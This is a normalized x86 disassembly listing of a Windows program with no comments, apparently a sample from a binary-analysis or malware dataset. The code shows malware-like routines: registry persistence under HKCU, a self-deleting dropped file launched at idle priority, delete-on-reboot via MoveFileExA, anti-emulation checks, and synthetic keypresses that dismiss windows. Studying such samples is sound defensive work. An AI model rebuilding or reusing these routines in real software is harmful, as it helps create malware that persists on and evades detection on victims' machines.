call sub_403505
mov esi eax
test esi esi
jne r-xdata
mov esi edi
call sub_40359a
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_401f79
push ebp
mov ebp esp
sub esp 0x264
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
xor ebx ebx
inc ebx
lea eax [ ebp - 0x158 ]
push r--data
push eax
mov [ ebp - 0x8 ] ebx
mov [ rw-data ] ebx
call sub_401000
mov edi [ Sleep@IAT ]
pop ecx
pop ecx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x260 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_401e76
add esp 0xc
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
shl esi 0x5
lea eax [ ebp + esi + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_401000
lea eax [ ebp + esi + 0x6e ]
push eax
lea eax [ ebp - 0x50 ]
push eax
call sub_401000
push r--data
push r--data
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0x260 ]
push eax
call sub_404c51
lea eax [ ebp - 0x30 ]
add esp 0x24
lea edx [ eax + 0x1 ]
call sub_40557f
push 0xa
cdq
pop ecx
idiv ecx
imul edx edx 0x2710
push edx
call edi
and [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0xc ] 0x7
je r-xdata
push eax
call sub_404d8e
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
call sub_40557f
push 0xa
cdq
pop ecx
idiv ecx
imul edx edx 0x64
push edx
call edi
push 0x2
pop eax
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ rw-data ] eax
mov [ ebp - 0x8 ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_40208d
push ebp
mov ebp esp
sub esp 0x264
push ebx
push esi
push edi
xor ebx ebx
push 0x27
lea eax [ ebp - 0x2b ]
push ebx
push eax
mov [ ebp - 0x2c ] bl
call sub_40b0d0
add esp 0xc
mov esi 0x103
push esi
lea eax [ ebp - 0x25f ]
push ebx
push eax
mov [ ebp - 0x260 ] bl
call sub_40b0d0
add esp 0xc
push esi
lea eax [ ebp - 0x157 ]
push ebx
push eax
mov [ ebp - 0x158 ] bl
call sub_40b0d0
add esp 0xc
xor edi edi
lea esi [ ebp + 0x76 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
inc edi
add esi 0x20
cmp edi 0x3
jl r-xdata
xor eax eax
lea eax [ esi - 0x66 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
call sub_401000
pop ecx
lea eax [ ebp - 0x158 ]
pop ecx
lea edx [ eax + 0x1 ]
or eax 0xffffffff
mov cl [ ebp + eax - 0x158 ]
mov [ ebp + eax - 0x2c ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x4c ]
push esi
push eax
call sub_401000
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_401000
push [ ebp + 0xc ]
lea eax [ ebp - 0x4c ]
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0x260 ]
push eax
call sub_404c51
add esp 0x24
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x260 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_401e76
add esp 0xc
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
cmp eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x8
jb r-xdata
push eax
call sub_404d8e
pop ecx
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4021a2
push ebp
mov ebp esp
sub esp 0x384
push ebx
push esi
push edi
xor ebx ebx
push 0x27
lea eax [ ebp - 0x47 ]
push ebx
push eax
mov [ ebp - 0x48 ] bl
call sub_40b0d0
add esp 0xc
mov esi 0x103
push esi
lea eax [ ebp - 0x277 ]
push ebx
push eax
mov [ ebp - 0x278 ] bl
call sub_40b0d0
add esp 0xc
push esi
lea eax [ ebp - 0x16f ]
push ebx
push eax
mov [ ebp - 0x170 ] bl
call sub_40b0d0
add esp 0xc
push esi
lea eax [ ebp - 0x37f ]
push ebx
push eax
mov [ ebp - 0x380 ] bl
call sub_40b0d0
lea eax [ ebp + 0x76 ]
add esp 0xc
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
inc [ ebp - 0x10 ]
add [ ebp - 0xc ] 0x20
cmp [ ebp - 0x10 ] 0x3
jl r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
add eax 0xffffff9a
push eax
lea eax [ ebp - 0x170 ]
push eax
call sub_401000
pop ecx
lea eax [ ebp - 0x170 ]
pop ecx
lea edx [ eax + 0x1 ]
or eax 0xffffffff
mov cl [ ebp + eax - 0x170 ]
mov [ ebp + eax - 0x48 ] cl
inc eax
cmp cl bl
jne r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x68 ]
push eax
call sub_401000
mov esi r--data
lea eax [ ebp - 0x170 ]
push esi
push eax
call sub_401000
mov edi [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x170 ]
push eax
lea eax [ ebp - 0x278 ]
push eax
call sub_404c51
add esp 0x24
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x278 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_401e76
mov ecx [ ebp - 0x8 ]
add ecx 0xfffffffc
add esp 0xc
mov [ ebp - 0x4 ] eax
cmp ecx 0x3
ja r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push 0x4
push eax
push edi
call sub_404ff0
add esp 0xc
push [ ebp - 0x4 ]
mov [ edi + 0x4 ] bl
call sub_404d8e
pop ecx
push ebx
push [ ebp + 0x8 ]
mov ebx edi
call sub_4014ee
lea eax [ ebp - 0x170 ]
push esi
push eax
call sub_401000
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x170 ]
push eax
lea eax [ ebp - 0x278 ]
push eax
call sub_404c51
and [ ebp - 0x8 ] 0x0
add esp 0x24
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x278 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call sub_401e76
add esp 0xc
cmp [ ebp - 0x8 ] 0x400
mov [ ebp - 0x4 ] eax
jbe r-xdata
push [ ebp - 0x4 ]
call sub_404d8e
pop ecx
xor ebx ebx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_401c9e
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
lea edx [ ebp - 0x20 ]
push [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0xff4cc3ff
mov [ ebp - 0x1c ] 0xcc22ccfc
mov [ ebp - 0x18 ] 0x32afaa
mov [ ebp - 0x14 ] 0x4d447c0a
call sub_402b1a
pop ecx
pop ecx
test eax eax
jbe r-xdata
mov ebx [ ebp - 0x4 ]
lea edi [ ebx + eax ]
mov ecx 0x16a
lea esi [ ebp + 0xd8 ]
[ edi ] [ esi ]
lea esi [ ebp - 0x170 ]
call sub_4040e0
test eax eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x170 ]
push ebx
push eax
call sub_401814
add esp 0xc
test eax eax
jne r-xdata
push 0x104
mov eax esi
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x380 ]
push r--data
push eax
call sub_401000
pop ecx
lea eax [ ebp - 0x380 ]
pop ecx
mov edx eax
push 0x3e8
call [ Sleep@IAT ]
push ebx
call sub_404d8e
pop ecx
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x170 ]
sub eax edx
dec edi
pop edi
pop esi
pop ebx
leave
retn
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_40244b
push ebp
mov ebp esp
sub esp 0x7e4
push ebx
push esi
push edi
xor ebx ebx
push 0x103
mov edi eax
lea eax [ ebp - 0x2ef ]
push ebx
push eax
mov [ ebp - 0x2f0 ] bl
call sub_40b0d0
add esp 0xc
push 0x3f
lea eax [ ebp - 0xdf ]
push ebx
push eax
mov [ ebp - 0xe0 ] bl
call sub_40b0d0
add esp 0xc
lea eax [ ebp - 0xe0 ]
push r--data
push eax
call sub_401000
push 0x3f
lea eax [ ebp - 0x9f ]
push ebx
push eax
mov [ ebp - 0xa0 ] bl
call sub_40b0d0
add esp 0x14
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_401000
lea eax [ ebp - 0xe0 ]
push eax
call sub_401c23
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push ebx
push edi
call [ MoveFileExA@IAT ]
jmp r-xdata
lea eax [ ebp - 0xa0 ]
push eax
call sub_401c23
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x2f0 ]
push r--data
push eax
call sub_401000
mov esi [ lstrcpyA@IAT ]
pop ecx
pop ecx
push edi
lea eax [ ebp - 0x3f8 ]
push eax
call esi
lea eax [ ebp - 0x3f8 ]
push 0x5c
push eax
call sub_4055b0
pop ecx
mov [ eax ] bl
pop ecx
lea eax [ ebp - 0x3f8 ]
push eax
lea eax [ ebp - 0x1e8 ]
push eax
call esi
mov esi [ lstrcatA@IAT ]
push r--data
lea eax [ ebp - 0x1e8 ]
push eax
call esi
lea eax [ ebp - 0x2f0 ]
push eax
lea eax [ ebp - 0x1e8 ]
push eax
call esi
push ebx
push 0x8000080
push 0x2
push ebx
push ebx
push 0x40000000
lea eax [ ebp - 0x1e8 ]
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push ebx
call [ PostQuitMessage@IAT ]
lea eax [ ebp - 0x1e8 ]
push eax
push edi
push edi
lea eax [ ebp - 0x7e0 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x14
push ebx
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x7e0 ]
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x7e0 ]
push eax
push esi
call [ WriteFile@IAT ]
push esi
mov esi [ CloseHandle@IAT ]
call esi
push 0x64
call [ Sleep@IAT ]
push 0x44
pop edi
push edi
lea eax [ ebp - 0x60 ]
push ebx
push eax
call sub_40b0d0
add esp 0xc
xor eax eax
mov [ ebp - 0x30 ] ax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
push ebx
push ebx
push edi
push ebx
push ebx
push ebx
lea eax [ ebp - 0x1e8 ]
push eax
push ebx
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x34 ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov edi [ SetThreadPriority@IAT ]
push 0xfffffff1
push [ ebp - 0xc ]
call edi
push 0xf
call [ GetCurrentThread@IAT ]
push eax
call edi
push 0x80
call [ GetCurrentProcess@IAT ]
push eax
call [ SetPriorityClass@IAT ]
push [ ebp - 0x10 ]
call esi
push [ ebp - 0xc ]
call [ ResumeThread@IAT ]
push [ ebp - 0xc ]
call esi
sub_402665
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
mov edi 0xf003f
push edi
xor ebx ebx
push ebx
push [ ebp + 0x8 ]
mov esi 0x80000001
push esi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
lea esi [ eax + 0x1 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push edi
push ebx
push r--data
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x1
push esi
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push [ ebp + 0x10 ]
push 0x1
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0x4 ]
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi ebx
sete al
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4026f0
push ebp
mov ebp esp
sub esp 0x308
push 0xff
lea eax [ ebp - 0xff ]
push 0x0
push eax
mov [ ebp - 0x100 ] 0x0
call sub_40b0d0
lea eax [ ebp - 0x100 ]
push r--data
push eax
call sub_401000
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x308 ]
add esp 0x14
sub ecx eax
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
test dl dl
jne r-xdata
push ebx
mov ebx r--data
mov eax ebx
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
lea eax [ ebp - 0x308 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x100 ]
push eax
call sub_402665
add esp 0xc
pop ebx
leave
retn
push esi
push edi
lea edi [ ebp - 0x308 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
lea edi [ ebp - 0x308 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
sub_40279c
push ebp
mov ebp esp
sub esp 0x780
push esi
lea edx [ ebp - 0x110 ]
push edi
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x110 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x110 ]
movsw [ edi ] [ esi ]
call sub_4040c0
mov edi 0x670
mov esi rw-data
test eax eax
je r-xdata
push edi
lea eax [ ebp - 0x780 ]
push esi
push eax
call sub_401080
lea eax [ ebp - 0x780 ]
push eax
push ebx
call sub_401000
lea eax [ ebp - 0x760 ]
push eax
lea eax [ ebx + 0x20 ]
push eax
call sub_401000
lea eax [ ebp - 0x740 ]
push eax
lea eax [ ebx + 0x40 ]
push eax
call sub_401000
mov ax [ ebp - 0x720 ]
mov [ ebx + 0x60 ] ax
mov ax [ ebp - 0x71e ]
mov [ ebx + 0x62 ] ax
mov ax [ ebp - 0x71c ]
mov [ ebx + 0x64 ] ax
lea eax [ ebp - 0x71a ]
push eax
lea eax [ ebx + 0x66 ]
push eax
call sub_401000
lea eax [ ebp - 0x6fa ]
push eax
lea eax [ ebx + 0x86 ]
push eax
call sub_401000
lea eax [ ebp - 0x6da ]
push eax
lea eax [ ebx + 0xa6 ]
push eax
call sub_401000
mov al [ ebp - 0x6ba ]
add esp 0x3c
lea edi [ ebx + 0xc8 ]
mov ecx 0x16a
lea esi [ ebp - 0x6b8 ]
[ edi ] [ esi ]
pop edi
mov [ ebx + 0xc6 ] al
pop esi
leave
retn
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_405299
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push eax
push edi
push 0x1
push esi
call sub_405550
push [ ebp - 0x4 ]
call sub_4059b1
add esp 0x14
sub_4028cf
push ebp
mov ebp esp
sub esp 0x784
push ebx
push esi
mov esi eax
push edi
mov ebx rw-data
test esi esi
je r-xdata
push 0x104
lea eax [ ebp - 0x110 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edi [ ebp - 0x110 ]
dec edi
lea edx [ eax + 0x1 ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x110 ]
movsw [ edi ] [ esi ]
call sub_4040c0
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
push 0x670
lea eax [ ebp - 0x780 ]
push ebx
push eax
call sub_401080
add esp 0xc
xor eax eax
cmp [ ebp - 0x6ba ] al
pop edi
pop esi
setne al
pop ebx
leave
retn
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_405299
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax esi
sub edx esi
push esi
push 0x670
push 0x1
push ebx
call sub_405550
push esi
call sub_4059b1
add esp 0x14
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x110 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x110 ]
movsw [ edi ] [ esi ]
call sub_4040c0
test eax eax
je r-xdata
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_405299
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push 0x670
push 0x1
push ebx
call sub_405550
push esi
call sub_4059b1
add esp 0x14
sub_4029eb
push ebp
mov ebp esp
sub esp 0xc4
push ebx
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
xor eax eax
inc eax
call sub_404500
test eax eax
jne r-xdata
call sub_4044d0
test eax eax
jne r-xdata
xor ebx ebx
push 0x3f
lea eax [ ebp - 0x7f ]
push ebx
push eax
mov [ ebp - 0x80 ] bl
call sub_40b0d0
add esp 0xc
lea eax [ ebp - 0x80 ]
push r--data
push eax
call sub_401000
push 0x3f
lea eax [ ebp - 0x3f ]
push ebx
push eax
mov [ ebp - 0x40 ] bl
call sub_40b0d0
add esp 0x14
lea eax [ ebp - 0x40 ]
push r--data
push eax
call sub_401000
push 0x3f
lea eax [ ebp - 0xbf ]
push ebx
push eax
mov [ ebp - 0xc0 ] bl
call sub_40b0d0
add esp 0x14
lea eax [ ebp - 0xc0 ]
push r--data
push eax
call sub_401000
lea eax [ ebp - 0x80 ]
push eax
call sub_401c23
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
call sub_401c23
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0xc0 ]
push eax
call sub_401c23
pop ecx
test eax eax
je r-xdata
pop ebx
leave
retn
sub_402ac2
call sub_4041f0
test eax eax
je r-xdata
call sub_404390
test eax eax
jne r-xdata
xor eax eax
inc eax
retn
push r--data
call sub_404850
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_404850
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_404850
pop ecx
test eax eax
jne r-xdata
call sub_4042a0
test eax eax
jne r-xdata
call sub_404440
neg eax
sbb eax eax
neg eax
retn
sub_402b1a
push ebp
mov ebp esp
sub esp 0x14
push edi
xor eax eax
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x14 ] 0x0
lea edi [ ebp - 0x13 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jne r-xdata
push esi
lea ecx [ ebp - 0x13 ]
lea esi [ ebp - 0x14 ]
sub esi edx
mov edi ecx
push 0x4
lea eax [ edx + 0x2 ]
sub edi edx
pop edx
push ebx
or eax 0xffffffff
jmp r-xdata
mov bl [ eax - 0x2 ]
mov [ ecx - 0x1 ] bl
mov bl [ eax - 0x1 ]
mov [ ecx ] bl
mov bl [ eax ]
mov [ esi + eax ] bl
mov bl [ eax + 0x1 ]
mov [ edi + eax ] bl
add ecx 0x4
add eax 0x4
dec edx
jne r-xdata
mov edi [ ebp + 0xc ]
sub edi 0x10
xor esi esi
pop ebx
test edi edi
jle r-xdata
pop edi
leave
retn
cmp esi edi
jne r-xdata
push 0x10
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
add eax esi
push eax
call sub_404cce
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x10 ]
or eax 0xffffffff
jmp r-xdata
inc esi
cmp esi edi
jl r-xdata
pop esi
sub_402ba6
push esi
mov esi [ keybd_event@IAT ]
push edi
xor edi edi
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
push eax
call [ SetForegroundWindow@IAT ]
push edi
push edi
push edi
push 0x1b
call esi
push edi
push 0x2
push edi
push 0x1b
call esi
push r--data
push edi
call [ FindWindowA@IAT ]
cmp eax edi
je r-xdata
sub_402be6
push ebp
mov ebp esp
sub esp 0x30
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x30 ] 0x30
mov [ ebp - 0x2c ] 0x3
mov [ ebp - 0x28 ] DefWindowProcA
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0x8 ] r--data
call [ RegisterClassExA@IAT ]
leave
retn
sub_402c32
push esi
xor esi esi
push esi
push eax
push esi
push esi
push esi
push esi
push 0xffffff9c
push 0xffffff9c
push 0xcf0000
push r--data
push r--data
push 0x80
mov [ rw-data ] eax
call [ CreateWindowExA@IAT ]
cmp eax esi
mov [ rw-data ] eax
pop esi
jne r-xdata
push [ esp + 0x4 ]
push eax
call [ ShowWindow@IAT ]
push [ rw-data ]
call [ UpdateWindow@IAT ]
xor eax eax
inc eax
retn
xor eax eax
retn
sub_402c86
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xce4
push ebx
push esi
push edi
xor ebx ebx
push 0x3f
lea eax [ esp + 0x335 ]
push ebx
push eax
mov [ esp + 0x33c ] bl
call sub_40b0d0
add esp 0xc
lea eax [ esp + 0x330 ]
push r--data
push eax
call sub_401000
lea eax [ esp + 0x338 ]
push eax
call sub_401c23
add esp 0xc
test eax eax
je r-xdata
push 0xa
xor eax eax
pop ecx
lea edi [ esp + 0x35 ]
mov [ esp + 0x34 ] bl
[ edi ]
mov [ esp + 0x20 ] bl
lea edi [ esp + 0x21 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov esi 0x103
push esi
stosd [ edi ]
lea eax [ esp + 0xe5 ]
push ebx
push eax
mov [ esp + 0xec ] bl
call sub_40b0d0
add esp 0xc
push esi
lea eax [ esp + 0x475 ]
push ebx
push eax
mov [ esp + 0x47c ] bl
call sub_40b0d0
add esp 0xc
push esi
lea eax [ esp + 0x1ed ]
push ebx
push eax
mov [ esp + 0x1f4 ] bl
call sub_40b0d0
add esp 0xc
push ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
call sub_405d47
pop ecx
push eax
call sub_40556d
pop ecx
call sub_403467
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
call sub_402be6
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
call sub_402c32
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov esi [ ebp + 0x10 ]
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push sub_402ba6
push ebx
push ebx
call [ CreateThread@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ esp + 0x1e8 ] bl
mov eax esi
lea edx [ eax + 0x1 ]
push ebx
push r--data
push ebx
push ebx
call [ MessageBoxA@IAT ]
push 0x64
call [ Sleep@IAT ]
push 0xffffffff
push esi
call [ TerminateThread@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
call sub_402ac2
test eax eax
je r-xdata
push 0x104
lea eax [ esp + 0xe4 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ esp + 0xe0 ]
call sub_40244b
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
cmp esi ebx
je r-xdata
lea eax [ esp + 0x1e8 ]
mov [ esp + 0x14 ] 0x1
call sub_4028cf
test eax eax
je r-xdata
lea edx [ esp + 0x1e8 ]
mov eax esi
sub edx esi
push 0x3f
lea eax [ esp + 0x2f5 ]
push ebx
push eax
mov [ esp + 0x2fc ] bl
call sub_40b0d0
add esp 0xc
lea eax [ esp + 0x2f0 ]
push r--data
push eax
call sub_401000
lea eax [ esp + 0x2f8 ]
push eax
call sub_401c23
add esp 0xc
test eax eax
je r-xdata
push 0x5c
push esi
call sub_4055b0
pop ecx
pop ecx
test eax eax
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
jmp r-xdata
push 0x3f
pop esi
push esi
lea eax [ esp + 0x375 ]
push ebx
push eax
mov [ esp + 0x37c ] bl
call sub_40b0d0
add esp 0xc
lea eax [ esp + 0x370 ]
push r--data
push eax
call sub_401000
push esi
lea eax [ esp + 0xad ]
push ebx
push eax
mov [ esp + 0xb4 ] bl
call sub_40b0d0
add esp 0x14
lea eax [ esp + 0xa0 ]
push r--data
push eax
call sub_401000
push esi
lea eax [ esp + 0x6d ]
push ebx
push eax
mov [ esp + 0x74 ] bl
call sub_40b0d0
add esp 0x14
lea eax [ esp + 0x60 ]
push r--data
push eax
call sub_401000
push esi
lea eax [ esp + 0x3bd ]
push ebx
push eax
mov [ esp + 0x3c4 ] bl
call sub_40b0d0
add esp 0x14
lea eax [ esp + 0x3b0 ]
push r--data
push eax
call sub_401000
lea eax [ esp + 0x378 ]
push eax
call sub_401c23
mov esi [ ebp + 0x10 ]
add esp 0xc
mov edi eax
cmp esi ebx
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
cmp eax [ Sleep@IAT ]
jne r-xdata
push 0x3e8
call [ Sleep@IAT ]
push 0x104
lea eax [ esp + 0xe4 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ esp + 0x1e8 ]
push r--data
push eax
call sub_401000
lea eax [ esp + 0x1f0 ]
push eax
lea eax [ esp + 0xec ]
push eax
call sub_404180
add esp 0x10
test eax eax
je r-xdata
call sub_403429
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
lea ecx [ esp + 0x1e8 ]
push ecx
push ebx
push ebx
call eax
mov [ esp + 0x10 ] eax
cmp eax ebx
je r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
push 0x5
mov esi eax
pop ecx
mov edi r--data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
call sub_4040e0
test eax eax
jne r-xdata
push 0x104
lea eax [ esp + 0xe4 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
push 0x3f
lea eax [ esp + 0x3f5 ]
push ebx
push eax
mov [ esp + 0x3fc ] bl
call sub_40b0d0
add esp 0xc
lea eax [ esp + 0x3f0 ]
push r--data
push eax
call sub_401000
lea eax [ esp + 0x3f8 ]
push eax
call sub_401c23
add esp 0xc
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
push esi
call [ DeleteFileA@IAT ]
mov [ esi ] bl
lea eax [ esp + 0xa0 ]
push eax
call sub_401c23
pop ecx
test eax eax
jne r-xdata
lea eax [ esp + 0xe0 ]
push eax
lea eax [ esp + 0x474 ]
push eax
call sub_4026f0
pop ecx
pop ecx
jmp r-xdata
or ebx 0xffffffff
push r--data
push esi
call sub_404bff
pop ecx
pop ecx
test eax eax
jne r-xdata
xor esi esi
lea eax [ esp + 0x60 ]
push eax
call sub_401c23
pop ecx
test eax eax
jne r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
mov eax ebx
jmp r-xdata
lea edx [ esp + 0xe0 ]
mov eax esi
sub edx esi
push 0x104
lea eax [ esp + 0xe4 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
test cl cl
jne r-xdata
call sub_4029eb
test eax eax
je r-xdata
cmp edi ebx
jne r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
xor eax eax
inc eax
mov esi eax
mov [ esp + 0x18 ] eax
jmp r-xdata
xor ebx ebx
lea eax [ esp + 0xe0 ]
cmp esi ebx
je r-xdata
cmp [ esp + 0x18 ] 0x0
jne r-xdata
xor esi esi
inc esi
jmp r-xdata
lea ebx [ esp + 0xe0 ]
call sub_404120
lea edx [ esp + 0x470 ]
push r--data
push eax
call sub_405299
mov esi eax
pop ecx
pop ecx
cmp esi ebx
je r-xdata
lea ebx [ esp + 0x680 ]
call sub_40279c
sub esp 0x670
mov ecx 0x19c
mov esi ebx
mov edi esp
[ edi ] [ esi ]
call sub_401f79
push [ esp + 0x684 ]
lea eax [ esp + 0x6a8 ]
push eax
lea ebx [ esp + 0x698 ]
call sub_4014ee
lea eax [ esp + 0xa28 ]
add esp 0x678
push eax
call sub_401c23
pop ecx
sub esp 0x670
test eax eax
mov edi esp
mov eax ebx
push eax
mov ecx 0x19c
lea esi [ esp + 0xcf4 ]
lea eax [ esp + 0x6a8 ]
[ edi ] [ esi ]
push eax
je r-xdata
lea eax [ esp + 0xe0 ]
call sub_40244b
